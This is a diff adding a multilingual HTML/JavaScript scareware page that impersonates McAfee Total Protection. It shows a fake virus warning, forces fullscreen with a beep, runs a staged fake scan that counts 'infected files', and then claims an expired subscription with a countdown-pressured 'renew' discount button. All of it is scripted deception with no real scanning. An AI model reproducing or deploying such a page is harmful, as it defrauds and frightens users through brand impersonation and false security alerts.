@@ -1,0 +1,1129 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<title>McAfee&reg; Total Protection</title>
+<meta name="robots" content="noindex,nofollow">
+<meta name="theme-color" content="#bf1818" />
+<link rel="icon" type="image/x-icon" href="favicon.ico">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<script>
+function getURLParameter(name) {
+return decodeURI(
+(RegExp(name + '=' + '(.*?)(&|$)').exec(location.search)||[,null])[1] || ''
+);
+}
+
+  // translation script
+    var getUrlParameter = function getUrlParameter(sParam) {
+    var sPageURL = window.location.search.substring(1),
+        sURLVariables = sPageURL.split('&'),
+        sParameterName,
+        i;
+
+    for (i = 0; i < sURLVariables.length; i++) {
+        sParameterName = sURLVariables[i].split('=');
+
+        var key = decodeURIComponent(sParameterName[0]);
+        var value = decodeURIComponent(sParameterName[1]);
+
+        if (key === sParam) {
+            return value === undefined ? true : value;
+        }
+    }
+};
+	var lang = getUrlParameter('language').split('-',1);
+	
+	var country = getURLParameter('country');
+</script>
+<link rel="stylesheet" type="text/css" href="css/circle_mcf.css" />
+<style type="text/css">
+*{
+	margin:0;padding:0;box-sizing:border-box;
+	-webkit-transition: all .2s ease;
+    -o-transition: all .2s ease;
+    transition: all .2s ease;
+}
+ body {
+	 background:#4D0416 url(webp/bg.webp);
+            -webkit-background-size: cover;
+            -moz-background-size: cover;
+            -o-background-size: cover;
+            background-size: cover;
+            font-family: Arial;
+user-select: none;
+}
+img {
+-webkit-user-drag: none;
+-khtml-user-drag: none;
+-moz-user-drag: none;
+-o-user-drag: none;
+user-drag: none;
+max-width:100%;
+}
+ p {line-height: 1.5em;margin-bottom: 20px;}
+/* Hide scrollbar */
+#wraper::-webkit-scrollbar {
+  width: 0;
+}
+
+
+/*Loader*/
+.loader-wrapper {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+   /* background:rgba(189, 195, 199, 0.9);*/
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    z-index: 9999;
+    transition: opacity 0.3s;
+}
+
+.loader {
+    border: 8px solid #fff;
+    border-top: 8px solid #d31346;
+    border-radius: 50%;
+    width: 50px;
+    height: 50px;
+    animation: spin 1s linear infinite;
+}
+
+@keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+}
+
+
+
+
+
+/*Main content*/
+#wraper {
+    position: fixed;
+    top: 0;
+    left: 5px;
+    right: 5px;
+    bottom: 0;
+    z-index: 9999;
+    display: flex;
+    overflow-Y: scroll;
+}
+
+.main_wraper{
+    width: 100%;
+    max-width: 745px;
+		 margin: auto auto;
+	
+}
+
+
+.wrapper {
+background: #fff url(webp/av.webp) top right no-repeat;
+    margin: 0px auto;
+    font-size: 17px;
+    color: #333;
+    position: relative;
+    box-shadow: 0px 0px 2px 3px #646464;
+    border-radius: 10px;
+    margin-bottom: 25px;
+}
+
+.header {text-align: center;margin: 30px 0 20px;    overflow: hidden;}
+.header img {width: 100%; max-width: 150px;}
+
+
+.heading {
+text-align: center;
+background: linear-gradient(91.41deg, #D31242 -4.1%, #870022 70.02%);
+border-radius: 10px 10px 0 0;
+ font-weight: normal; font-size: 26px; color: #fff;    padding:21px 5px;margin:0;}	
+		
+.content{
+ padding: 20px 30px;
+ padding-bottom: 40px;}
+.offer-text{ line-height: 23px;}
+.disc{background-color:#ffd703; font-weight:bold; color:#333; padding:5px;}
+
+		
+	.bli{
+	background: rgba(255, 184, 0, 0.2);
+    border-radius: 10px;
+    display: flex;
+    align-items: center;
+    justify-content: flex-start;
+    padding: 10px;
+	    border: 2px solid #e5e5e5;
+	}	
+	.bli span{
+    background: #FFB800;
+    background: #D31242;
+    height: 32px;
+    text-align: center;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    border-radius: 8px;
+    flex: 0 0 32px;
+	}
+.bli img {width: 18px;}
+        .bli h4 {
+    font-size: 16px;
+    margin-bottom: 0px;
+    color: #CC970D;
+	color: #D31242 !important;
+    margin-left: 10px;
+        }
+
+.available {
+    text-align: center;
+    margin: 18px 0 0;
+}
+.available img {
+    width: 18px;
+    position: relative;
+    top: 6px;
+}
+.green{    color: #26B16E}
+.red{    color: #D31242;}
+
+.product_serial {
+    text-align: center;
+    display: block;
+    margin: 25px 0 10px;
+}
+
+
+
+.offer-button {
+            color: #fff;
+			background-color: #167103;
+			border-color: #167103;
+            display: block;
+            text-decoration: none;
+            font-size: 18px;
+            font-weight: bold;
+            padding: 16px;
+            text-align: center;
+            border-radius: 5px;
+            border: 0;
+			background: linear-gradient(179deg, #D31242 -4.1%, #870022 70.02%);
+    box-shadow: 0px 5px 19px rgb(211 18 66 / 40%);
+    border-radius: 10px;
+	cursor: pointer;
+ }
+.offer-button:hover {background: linear-gradient(1deg, #D31242 -4.1%, #870022 70.02%);
+}
+
+.cd_timer { text-align: center;color: grey;font-size: 8pt;margin: 35px 10px;}
+#cd_av {color: #FF7800;opacity: 0.5;}
+
+
+/*Animations*/
+.blinking {animation: blinkingText 1.6s infinite;}
+.upDown{ position: relative;-webkit-animation: upDown 3s ease-in-out infinite;animation: upDown 3s ease-in-out infinite;}
+.wave {
+  background: #0071E8;
+  border-radius:10px;
+  box-shadow: 0 0 0px 0px rgba(255, 255, 255, 0.5);
+  transition: 250ms color;
+  -webkit-transition: 250ms color;
+  -moz-transition: 250ms color;
+  -ms-transition: 250ms color;
+  -o-transition: 250ms color;
+  animation-name: wave;
+  animation-duration: 1s;
+  animation-timing-function: linear;
+  animation-iteration-count: infinite;
+}
+
+
+@keyframes blinkingText {
+      0% { color: #D31242;}
+      49% {color: #D31242;}
+      60% {color: #D31242;}
+      99% {color: transparent;}
+      100% {color: #D31242;}
+}
+			
+@-webkit-keyframes upDown{0%{transform:translateY(-4px)}50%{transform:translateY(0)}to{transform:translateY(-4px)}}
+@keyframes upDown{0%{transform:translateY(-4px)}50%{transform:translateY(0)}to{transform:translateY(-4px)}}
+
+@keyframes wave {
+  0% {box-shadow: 0 0 0px 0px rgba(39, 174, 96, 0.5);}
+  100% {box-shadow: 0 0 0px 15px rgba(39, 174, 96, 0);}
+}
+	
+	
+	
+/*Responsive css*/
+@media only screen and (max-width: 767px) {.content {padding:20px 20px 40px;}}	
+
+@media only screen and (max-width: 500px) {
+	.heading {font-size: 20px;padding: 11px 4px;}
+	.offer-text {padding-left: 0;}
+	.disc {padding: 0px 3px;}
+	.cd_timer {margin: 20px 10px 100px;}
+}	
+			
+@media screen and ( max-height: 480px ) {		
+.cd_timer {margin: 20px 10px 100px;}
+}
+
+
+
+
+/*Pop up - scan pop*/
+.full_pop {
+position: fixed;
+    left: 0;
+    top: 0;
+    width: 100%;
+    height: 100%;
+   /* background: rgb(51, 51, 51, 0.9);*/
+    z-index: 999;
+    text-align: center;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+	transition: 0.3s;
+}
+.full_pop.hide{opacity:0;visibility:hidden;z-index:-999;}
+.full_wraper {
+    transform: scale(0);
+    opacity: 0;
+    visibility: hidden;
+    transition: 0.3s;
+    max-width: 600px;
+    background: #fff;
+    width: 98%;
+}
+.full_wraper.show{
+   transform: scale(1);
+    opacity: 1;
+    visibility: visible;
+    transition: 0.3s;
+}
+
+.full_logo {position: fixed;top: 18px;left: 25px;}
+.full_logo img {width: 131px;}
+.full_content {color: #fff;font-size: 20px;}
+.full_title {  
+  display: flex;
+    align-items: center;
+    justify-content: center;
+    width: 265px;}
+.full_title img {width: 45px;margin-right: 19px;}
+.full_title span {    line-height: 1.3;}
+.full_footer {max-width: 235px;margin: auto;    line-height: 1.3;}
+
+
+#full_head_area {
+display: flex;
+    align-items: center;
+    background: #C81A00;
+	    color: #fff;
+      padding: 8px;
+
+}
+#full_head_area span {
+    font-size: 26px;
+    margin: 0 auto;
+	line-height: 1;
+}
+#full_head_area img {
+    width: 32px;
+    margin-right: 10px;
+}
+#full_desc {
+    color: #3ffb05;
+    font-weight: bold;
+}
+
+
+.pop_full_body {
+    color: #000;
+    text-align: left;
+    padding: 20px 15px 34px;
+    border-bottom: 1px solid #ddd;
+}
+
+.pop_full_body p {margin: 0;    font-size: 17px;}
+p.txtbig {font-size: 20px;margin: 20px 0;font-weight: bold;}
+
+.full_pop_cta {
+    margin: 0;
+    padding: 13px;
+    text-align: right;
+}
+
+.full_pop_cta button {
+    position: relative;
+    vertical-align: top;
+	max-width: 300px;
+    width: 100%;
+    height: 36px;
+    padding: 0;
+    font-size: 22px;
+    color: #fff;
+    text-align: center;
+    text-shadow: 0 1px 2px rgba(0,0,0,.25);
+    background: #27ae60;
+    background: radial-gradient(#01EF65, #0a9343);
+    border: 0;
+    border-bottom: 2px solid #219d55;
+    border-radius: 5px;
+    cursor: pointer;
+    -webkit-box-shadow: inset 0 -2px #219d55;
+    box-shadow: inset 0 -2px #219d55;
+}
+
+.full_pop_cta button:hover{
+	background: #01EF65;
+	background: linear-gradient(145deg, #01EF65, #0a9343);
+    background: radial-gradient(#0dbf57, #0dbf57);
+}
+
+
+
+/*Lastpop 02 */
+.lastpop {
+    position: fixed;
+    background: #fff;
+    margin: auto;
+    max-width: 500px;
+    width: 98%;
+    left: 0;
+    right: 0;
+    transform: translate(0, -50%);
+    top: 50%;
+    border: 1px solid #999;
+	z-index:3;
+	
+overflow-y: auto;
+max-height: calc(100% - 40px);
+	
+}
+
+.lastpop_head {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    background: #fff;
+    padding: 9px 10px 5px;
+}
+
+
+.lastpop_head_left img {
+    width: 108px;
+
+}
+
+.lastpop_head_right img {
+    margin-left: 10px;
+    cursor: pointer;
+}
+
+.lastpop_title {background: #c81a00;color: #fff;padding: 14px 12px;font-size: 24px;line-height: 1;}
+
+.lastpop_body {
+    padding: 12px;
+    font-size: 15px;
+}
+
+.lastpop_body p {
+    margin-top: 0;
+    margin-bottom: 10px;
+}
+.lastpop_brn_area {
+    margin: auto;
+    text-align: center;
+}
+
+.lastpop_body_right div {
+    margin-bottom: 22px;
+    display: inline-block;
+}
+
+
+
+.lastpop_body.lastpop_body_flex {
+display: flex;
+    justify-content: space-between;
+    flex-direction: row;
+}
+
+.lastpop_body_left {
+    position: relative;
+    width: 40%;
+    border-right: 1px solid #7e7e7e;
+    text-align: center;
+    margin: auto;
+	padding: 50px 0;
+}
+
+.lastpop_body_right {width: 50%;    padding: 25px 0;}
+.lastpop_body_right div {border:1px solid black;padding:15px;border-radius:10px;}
+
+.center{text-align: center;}
+
+.c100{float: left;margin: auto;}
+
+
+@media only screen and (max-width: 460px){
+.lastpop_body_left { border-right:0;}
+.lastpop_title {font-size: 20px;}
+.lastpop_body_right { z-index: 1;}
+
+}
+
+</style>
+</head>
+<body>
+
+<div class="loader-wrapper"><div class="loader"></div></div>
+<audio id="beep" src="beep.mp3" preload="auto"></audio>
+
+<div id="full_pop" class="full_pop">
+<div class="full_logo"><img src="webp/mc.webp" alt="logo" /></div>
+<div class="full_wraper">
+<div class="full_content">
+<div id="full_head_area"><img src="webp/ic_w.webp" alt="ic" /> <span id="modal_head">Virus Warning!</span></div>
+<div class="pop_full_body">
+<p id="modal_sub01">You may have visited unsafe websites with malicious content.</p>
+<p id="modal_sub02" class="txtbig">Your PC may be at risk of being infected by viruses</p>
+<p id="modal_sub03">To continue browsing safely - perform an antivirus scan.</p>
+</div>
+<div class="full_pop_cta">
+<button class="entry_btn wave" id="modal_btn">SCAN</button>
+</div>
+</div>
+</div>
+</div>
+
+<div class="lastpop" id="lastpop_02" style="max-width:600px; display:none;">
+<div class="lastpop_head">
+<div class="lastpop_head_left"><img src="webp/mc.webp" alt /></div>
+<div class="lastpop_head_right"><img src="webp/minus.webp" alt /><img src="webp/cross.webp" alt /></div>
+</div>
+<div class="lastpop_title center" id="w5_001">Processing: Please do not close</div>
+<div class="lastpop_body lastpop_body_flex">
+<div class="lastpop_body_left">
+
+<div class="c100 p0 red" id="circle_progress">
+<span id="circle_progress_val">0%</span>
+<div class="slice">
+<div class="bar"></div>
+<div class="fill"></div>
+</div>
+</div>
+</div>
+<div class="lastpop_body_right">
+<div><span id="w5_002">Selected infected files:</span> <span id="infected">0</span></div>
+<div style="display:none;" id="sys_perm"><span id="w5_003">System Permission: OK</span></div>
+<div style="display:none;" id="mc_subs"><span id="w5_004">McAfee Subscription:</span> <span style="color:#C51109"><strong id="w5_005">EXPIRED</strong></span></div>
+</div>
+</div>
+</div>
+<div id="wraper" style="display:none;">
+<div class="main_wraper">
+<div class="header"><a href="javascript:void(0)" onclick="out();PreventExitPop=false" rel="noreferrer" target="_blank"><img src="webp/mc.webp" alt="logo"></a></div>
+<div class="wrapper">
+<div class="heading" id="txt1">Your McAfee subscription has expired!</div>
+<div class="content">
+<p id="txt2">Your subscription of McAfee Total Protection has expired on <strong id="expdate">22/02/2024</strong></p>
+<p id="txt3">After the expiration date, your computer will become susceptible to many different virus threats. <strong>Your privacy may be at risk.</strong></p>
+<div class="bli"><span><img src="webp/ww.webp" alt="w" /></span><h4 id="txt4">Your computer is unprotected, exposing it to viruses and other malware...</h4></div>
+<div class="available"><img src="webp/c.webp" alt="c" /> <span id="txt5"><strong class="green">Available </strong> <strong class="red blinking">(-55%)</strong> Renewal Discount: (<strong id="todaydate">02/03/2024</strong>)</span></div>
+<div class="product_serial">
+<a href="javascript:void(0)" onclick="out();PreventExitPop=false" rel="noreferrer"><img id="img-prod" src="webp/serial.webp"></a>
+</div>
+<div class="button upDown"><a href="javascript:void(0)" onclick="out();PreventExitPop=false" rel="noreferrer" class="offer-button" id="txt6">RENEW SUBSCRIPTION NOW</a></div>
+</div>
+</div>
+<div class="cd_timer"><div id="countd"><sup>*</sup><span id="cd_av">Available For:</span> <span id="hmins">4</span> <span id="cd_m">minutes</span> <span id="hsecs">00</span> <span id="cd_s">seconds</span></div>
+</div>
+</div>
+</div>
+<script>
+document.addEventListener("DOMContentLoaded", function () {
+    setTimeout(function () {
+        //Hide the loader
+        preloaderHide();
+
+        //Show the entry popup
+		document.getElementsByClassName("full_wraper")[0].classList.add("show");
+    }, 1000);
+	
+//click on entry pop up to close
+	document.querySelector(".entry_btn").addEventListener("click", function () {
+	
+	document.getElementsByClassName("full_pop")[0].classList.add("hide");
+	preloaderShow();
+		
+	
+setTimeout(function () {
+	startMcf();
+}, 2000);
+	
+		document.documentElement.requestFullscreen();
+    });
+
+});	
+
+
+
+
+//start mcfee function 02
+function startMcf(){
+    document.getElementById("beep").play(); // beep
+    preloaderHide();
+    document.getElementById('lastpop_02').style.display = 'block';
+    startCircleProgress();
+    
+    setTimeout(function() {
+        document.getElementById('infected').textContent = '2';
+        document.getElementById('infected').style.color = '#ff0000';
+        document.getElementById('infected').style.fontWeight = 'bold';
+    }, 1000);
+    
+    setTimeout(function() {
+        document.getElementById('sys_perm').style.display = 'inline-block';
+        document.getElementById('infected').textContent = '3';
+    }, 3000);
+    
+    setTimeout(function() {
+        document.getElementById('infected').textContent = '4';
+    }, 4000);
+    
+    setTimeout(function() {
+        document.getElementById('infected').textContent = '5';
+        document.getElementById('mc_subs').style.display = 'inline-block';
+    }, 6000);
+    
+    setTimeout(function() {
+        document.getElementById('lastpop_02').style.display = 'none';
+        document.getElementById('wraper').style.display = 'flex';
+        startCountdown();
+    }, 10000);
+}
+
+
+
+
+
+function preloaderShow(){
+document.querySelector(".loader-wrapper").style.opacity = 1;
+document.querySelector(".loader-wrapper").style.display = "flex";
+}
+function preloaderHide(){
+document.querySelector(".loader-wrapper").style.opacity = 0;
+document.querySelector(".loader-wrapper").style.display = "none";
+}
+
+
+// circle progress function
+function startCircleProgress() {
+    var duration = 8800;
+    var st = new Date().getTime();
+    var interval = setInterval(function() {
+        var diff = Math.round(new Date().getTime() - st);
+        var val = Math.round(diff / duration * 100);
+        val = val > 100 ? 100 : val;
+        var circleProgress = document.getElementById("circle_progress");
+        var circleProgressVal = document.getElementById("circle_progress_val");
+        circleProgress.classList.add("p" + val);
+        circleProgressVal.textContent = val + "%";
+
+        if (val == 100) {
+            setTimeout(function() {
+                //alert("Finished!");
+            }, 1000);
+        }
+
+        if (diff >= duration)
+            clearInterval(interval);
+
+    }, 100);
+}
+//startCircleProgress();
+
+
+//Countdown
+    function startCountdown() {
+        var minsElement = document.getElementById("hmins");
+        var secsElement = document.getElementById("hsecs");
+
+        var mins = parseInt(minsElement.textContent);
+        var secs = parseInt(secsElement.textContent);
+
+        var countdownInterval = setInterval(function() {
+            if (mins === 0 && secs === 0) {
+                clearInterval(countdownInterval);
+                // Additional actions when countdown finishes can be added here
+                return;
+            }
+
+            if (secs === 0) {
+                mins--;
+                secs = 59;
+            } else {
+                secs--;
+            }
+
+            minsElement.textContent = pad(mins);
+            secsElement.textContent = pad(secs);
+        }, 1000);
+    }
+
+    function pad(value) {
+        return value < 10 ? "0" + value : value;
+    }
+
+    // Call startCountdown function to initiate the countdown
+   // startCountdown();
+
+	//document.getElementById('txt5').innerHTML = '' +isp+ '';
+  //English 
+  if (lang == 'en') {
+		document.getElementById('modal_head').innerHTML = 'Virus Warning!';
+		document.getElementById('modal_sub01').innerHTML = 'You may have visited unsafe websites with malicious content.';
+		document.getElementById('modal_sub02').innerHTML = 'Your Computer is at risk of being infected by viruses.';
+		document.getElementById('modal_sub03').innerHTML = 'To continue browsing safely - perform an antivirus scan.';
+		document.getElementById('modal_btn').innerHTML = 'SCAN';
+		
+		document.getElementById('w5_001').innerHTML = 'Processing: Please do not close';
+		document.getElementById('w5_002').innerHTML = 'Selected infected files:';
+		document.getElementById('w5_003').innerHTML = 'System Permission: OK';
+		document.getElementById('w5_004').innerHTML = 'McAfee Subscription:';
+		document.getElementById('w5_005').innerHTML = 'EXPIRED';
+		
+
+		document.getElementById('txt1').innerHTML = 'Your McAfee subscription has expired!';
+		document.getElementById('txt2').innerHTML = 'Your subscription of McAfee Total Protection has expired on  <strong id="expdate">22/02/2024</strong>';
+		document.getElementById('txt3').innerHTML = 'After the expiration date, your computer will become susceptible to many different virus threats. <strong>Your privacy may be at risk.</strong>';
+		document.getElementById('txt4').innerHTML = 'Your computer is unprotected, exposing it to viruses and other malware...';
+		document.getElementById('txt5').innerHTML = '<strong class="green">Available </strong> <strong class="red blinking">(-55%)</strong> Renewal Discount: (<strong id="todaydate">02/03/2024</strong>)';
+		document.getElementById('txt6').innerHTML = 'RENEW SUBSCRIPTION NOW';
+		
+		document.getElementById('cd_av').innerHTML = 'Available For';
+		document.getElementById('cd_m').innerHTML = 'minutes';
+		document.getElementById('cd_s').innerHTML = 'seconds';
+  }
+  
+  //Italian (it)
+  if (lang == 'it') {
+  
+document.getElementById('modal_head').innerHTML = 'Avviso Virus!';
+document.getElementById('modal_sub01').innerHTML = 'Potresti aver visitato siti web non sicuri con contenuti dannosi.';
+document.getElementById('modal_sub02').innerHTML = 'Il tuo computer è a rischio di essere infettato da virus.';
+document.getElementById('modal_sub03').innerHTML = 'Per continuare a navigare in sicurezza - esegui una scansione antivirus.';
+document.getElementById('modal_btn').innerHTML = 'SCANSIONA';
+
+document.getElementById('w5_001').innerHTML = 'Elaborazione in corso: non chiudere';
+document.getElementById('w5_002').innerHTML = 'File infetti selezionati:';
+document.getElementById('w5_003').innerHTML = 'Autorizzazione di sistema: OK';
+document.getElementById('w5_004').innerHTML = 'Abbonamento McAfee:';
+document.getElementById('w5_005').innerHTML = 'SCADUTO';
+
+document.getElementById('txt1').innerHTML = 'La tua sottoscrizione McAfee è scaduta!';
+document.getElementById('txt2').innerHTML = 'La tua sottoscrizione di McAfee Total Protection è scaduta il <strong id="expdate">22/02/2024</strong>';
+document.getElementById('txt3').innerHTML = 'Dopo la data di scadenza, il tuo computer diventerà suscettibile a molteplici minacce di virus. <strong>La tua privacy potrebbe essere a rischio.</strong>';
+document.getElementById('txt4').innerHTML = 'Il tuo computer è non protetto, esponendolo a virus e altri malware...';
+document.getElementById('txt5').innerHTML = '<strong class="green">Disponibile </strong> <strong class="red blinking">(-55%)</strong> Sconto di Rinnovo: (<strong id="todaydate">02/03/2024</strong>)';
+document.getElementById('txt6').innerHTML = 'RINNOVA LA SOTTOSCRIZIONE ORA';
+
+document.getElementById('cd_av').innerHTML = 'Disponibile Per';
+document.getElementById('cd_m').innerHTML = 'minuti';
+document.getElementById('cd_s').innerHTML = 'secondi';
+  }
+   
+  //French (FR) 
+  if (lang == 'fr') {
+document.getElementById('modal_head').innerHTML = 'Alerte Virus !';
+document.getElementById('modal_sub01').innerHTML = 'Vous avez peut-être visité des sites Web non sécurisés contenant du contenu malveillant.';
+document.getElementById('modal_sub02').innerHTML = 'Votre ordinateur est susceptible d’être infecté par des virus.';
+document.getElementById('modal_sub03').innerHTML = 'Pour continuer à naviguer en toute sécurité, effectuez une analyse antivirus.';
+document.getElementById('modal_btn').innerHTML = 'ANALYSER';
+
+document.getElementById('w5_001').innerHTML = 'Traitement en cours : Veuillez ne pas fermer';
+document.getElementById('w5_002').innerHTML = 'Fichiers infectés sélectionnés :';
+document.getElementById('w5_003').innerHTML = 'Autorisation du système : OK';
+document.getElementById('w5_004').innerHTML = 'Abonnement McAfee :';
+document.getElementById('w5_005').innerHTML = 'EXPIRÉ';
+
+document.getElementById('txt1').innerHTML = 'Votre abonnement McAfee a expiré !';
+document.getElementById('txt2').innerHTML = 'Votre abonnement McAfee Total Protection a expiré le <strong id="expdate">22/02/2024</strong>';
+document.getElementById('txt3').innerHTML = 'Après la date d’expiration, votre ordinateur deviendra vulnérable à de nombreuses menaces de virus différentes. <strong>Votre vie privée peut être en danger.</strong>';
+document.getElementById('txt4').innerHTML = 'Votre ordinateur n’est pas protégé, le rendant vulnérable aux virus et autres logiciels malveillants...';
+document.getElementById('txt5').innerHTML = '<strong class="green">Disponible </strong> <strong class="red blinking">(-55%)</strong> Remise de Renouvellement: (<strong id="todaydate">02/03/2024</strong>)';
+document.getElementById('txt6').innerHTML = 'RENOUVELER L’ABONNEMENT MAINTENANT';
+
+document.getElementById('cd_av').innerHTML = 'Disponible Pour';
+document.getElementById('cd_m').innerHTML = 'minutes';
+document.getElementById('cd_s').innerHTML = 'secondes';
+  }     
+   
+   //Chinese (ZH) (traditional) 
+  if (lang == 'zh') {
+document.getElementById('modal_head').innerHTML = '病毒警告！';
+document.getElementById('modal_sub01').innerHTML = '您可能已經訪問了帶有惡意內容的不安全網站。';
+document.getElementById('modal_sub02').innerHTML = '您的電腦有可能被病毒感染。';
+document.getElementById('modal_sub03').innerHTML = '為了繼續安全瀏覽 - 執行防病毒掃描。';
+document.getElementById('modal_btn').innerHTML = '掃描';
+
+document.getElementById('w5_001').innerHTML = '處理中：請勿關閉';
+document.getElementById('w5_002').innerHTML = '已選擇的受感染文件：';
+document.getElementById('w5_003').innerHTML = '系統許可：正常';
+document.getElementById('w5_004').innerHTML = 'McAfee 訂閱：';
+document.getElementById('w5_005').innerHTML = '已到期';
+
+document.getElementById('txt1').innerHTML = '您的 McAfee 訂閱已到期！';
+document.getElementById('txt2').innerHTML = '您的 McAfee Total Protection 訂閱已於 <strong id="expdate">22/02/2024</strong> 到期';
+document.getElementById('txt3').innerHTML = '過了到期日期後，您的電腦將變得容易受到多種不同的病毒威脅。 <strong>您的隱私可能會受到威脅。</strong>';
+document.getElementById('txt4').innerHTML = '您的電腦沒有受到保護，容易受到病毒和其他惡意軟體的侵害...';
+document.getElementById('txt5').innerHTML = '<strong class="green">可用 </strong> <strong class="red blinking">(-55%)</strong> 更新折扣: (<strong id="todaydate">02/03/2024</strong>)';
+document.getElementById('txt6').innerHTML = '立即續訂';
+
+document.getElementById('cd_av').innerHTML = '可用於';
+document.getElementById('cd_m').innerHTML = '分鐘';
+document.getElementById('cd_s').innerHTML = '秒';
+
+  } 
+
+
+//Spanish(es)
+if (lang == 'es') {
+document.getElementById('modal_head').innerHTML = '¡Alerta de virus!';
+document.getElementById('modal_sub01').innerHTML = 'Es posible que hayas visitado sitios web inseguros con contenido malicioso.';
+document.getElementById('modal_sub02').innerHTML = 'Tu computadora está en riesgo de ser infectada por virus.';
+document.getElementById('modal_sub03').innerHTML = 'Para seguir navegando de manera segura, realiza un escaneo antivirus.';
+document.getElementById('modal_btn').innerHTML = 'ESCANEAR';
+
+document.getElementById('w5_001').innerHTML = 'Procesando: Por favor, no cierres';
+document.getElementById('w5_002').innerHTML = 'Archivos infectados seleccionados:';
+document.getElementById('w5_003').innerHTML = 'Permiso del sistema: OK';
+document.getElementById('w5_004').innerHTML = 'Suscripción de McAfee:';
+document.getElementById('w5_005').innerHTML = 'CADUCADA';
+
+document.getElementById('txt1').innerHTML = '¡Tu suscripción a McAfee ha caducado!';
+document.getElementById('txt2').innerHTML = 'Tu suscripción a McAfee Total Protection ha caducado el <strong id="expdate">22/02/2024</strong>';
+document.getElementById('txt3').innerHTML = 'Después de la fecha de vencimiento, tu computadora se volverá susceptible a muchas amenazas de virus diferentes. <strong>Tu privacidad puede estar en riesgo.</strong>';
+document.getElementById('txt4').innerHTML = 'Tu computadora está desprotegida, exponiéndola a virus y otro malware...';
+document.getElementById('txt5').innerHTML = '<strong class="green">Disponible </strong> <strong class="red blinking">(-55%)</strong> Descuento por renovación: (<strong id="todaydate">02/03/2024</strong>)';
+document.getElementById('txt6').innerHTML = 'RENUEVA LA SUSCRIPCIÓN AHORA';
+
+document.getElementById('cd_av').innerHTML = 'Disponible por';
+document.getElementById('cd_m').innerHTML = 'minutos';
+document.getElementById('cd_s').innerHTML = 'segundos';
+}
+  
+  
+ //finnish(fi)
+if (lang == 'fi') {
+document.getElementById('modal_head').innerHTML = 'Virusvaroitus!';
+document.getElementById('modal_sub01').innerHTML = 'Olet saattanut vierailla turvattomilla verkkosivustoilla, joilla on haitallista sisältöä.';
+document.getElementById('modal_sub02').innerHTML = 'Tietokoneesi on vaarassa saada viruksen.';
+document.getElementById('modal_sub03').innerHTML = 'Jatkaaksesi turvallista selaamista - suorita virustarkistus.';
+document.getElementById('modal_btn').innerHTML = 'SKANATA';
+
+document.getElementById('w5_001').innerHTML = 'Käsittelyssä: Älä sulje';
+document.getElementById('w5_002').innerHTML = 'Valitut tartunnan saaneet tiedostot:';
+document.getElementById('w5_003').innerHTML = 'Järjestelmän lupa: OK';
+document.getElementById('w5_004').innerHTML = 'McAfeen tilaus:';
+document.getElementById('w5_005').innerHTML = 'VANHENTUNUT';
+
+document.getElementById('txt1').innerHTML = 'McAfeen tilauksesi on vanhentunut!';
+document.getElementById('txt2').innerHTML = 'McAfeen Total Protection -tilauksesi on vanhentunut <strong id="expdate">22/02/2024</strong>';
+document.getElementById('txt3').innerHTML = 'Päivämäärän jälkeen tietokoneesi altistuu monille erilaisille viruksen uhille. <strong>Yksityisyytesi voi olla vaarassa.</strong>';
+document.getElementById('txt4').innerHTML = 'Tietokoneesi on suojaamaton, altistaen sen viruksille ja muulle haittaohjelmalle...';
+document.getElementById('txt5').innerHTML = '<strong class="green">Saatavilla </strong> <strong class="red blinking">(-55%)</strong> Uusimisalennus: (<strong id="todaydate">02/03/2024</strong>)';
+document.getElementById('txt6').innerHTML = 'UUSI TILAUS NYT';
+
+document.getElementById('cd_av').innerHTML = 'Saatavilla';
+document.getElementById('cd_m').innerHTML = 'minuuttia';
+document.getElementById('cd_s').innerHTML = 'sekuntia';
+
+}  
+
+ //Norwegian (NO)
+if (lang == 'no') {
+document.getElementById('modal_head').innerHTML = 'Virusvarsel!';
+document.getElementById('modal_sub01').innerHTML = 'Du kan ha besøkt usikre nettsteder med skadelig innhold.';
+document.getElementById('modal_sub02').innerHTML = 'Din datamaskin er i fare for å bli infisert av virus.';
+document.getElementById('modal_sub03').innerHTML = 'For å fortsette å surfe trygt - utfør en antivirus-skanning.';
+document.getElementById('modal_btn').innerHTML = 'SKANN';
+
+document.getElementById('w5_001').innerHTML = 'Behandler: Vennligst ikke lukk';
+document.getElementById('w5_002').innerHTML = 'Valgte infiserte filer:';
+document.getElementById('w5_003').innerHTML = 'Systemtillatelse: OK';
+document.getElementById('w5_004').innerHTML = 'McAfee-abonnement:';
+document.getElementById('w5_005').innerHTML = 'UTLØPT';
+
+document.getElementById('txt1').innerHTML = 'Ditt McAfee-abonnement har utløpt!';
+document.getElementById('txt2').innerHTML = 'Ditt abonnement på McAfee Total Protection har utløpt den <strong id="expdate">22/02/2024</strong>';
+document.getElementById('txt3').innerHTML = 'Etter utløpsdatoen vil datamaskinen din bli sårbar for mange forskjellige virus-trusler. <strong>Din personvern kan være i fare.</strong>';
+document.getElementById('txt4').innerHTML = 'Din datamaskin er ubeskyttet, og utsetter den for virus og annen skadelig programvare...';
+document.getElementById('txt5').innerHTML = '<strong class="green">Tilgjengelig </strong> <strong class="red blinking">(-55%)</strong> Fornyelsesrabatt: (<strong id="todaydate">02/03/2024</strong>)';
+document.getElementById('txt6').innerHTML = 'FORNY ABONNEMENTET NÅ';
+
+document.getElementById('cd_av').innerHTML = 'Tilgjengelig for';
+document.getElementById('cd_m').innerHTML = 'minutter';
+document.getElementById('cd_s').innerHTML = 'sekunder';
+}
+
+ //Poruguese(pt)
+if (lang == 'pt') {
+document.getElementById('modal_head').innerHTML = 'Aviso de Vírus!';
+document.getElementById('modal_sub01').innerHTML = 'Você pode ter visitado sites inseguros com conteúdo malicioso.';
+document.getElementById('modal_sub02').innerHTML = 'Seu computador está em risco de ser infectado por vírus.';
+document.getElementById('modal_sub03').innerHTML = 'Para continuar navegando com segurança - execute uma verificação de antivírus.';
+document.getElementById('modal_btn').innerHTML = 'VERIFICAR';
+
+document.getElementById('w5_001').innerHTML = 'Processando: Por favor, não feche';
+document.getElementById('w5_002').innerHTML = 'Arquivos infectados selecionados:';
+document.getElementById('w5_003').innerHTML = 'Permissão do sistema: OK';
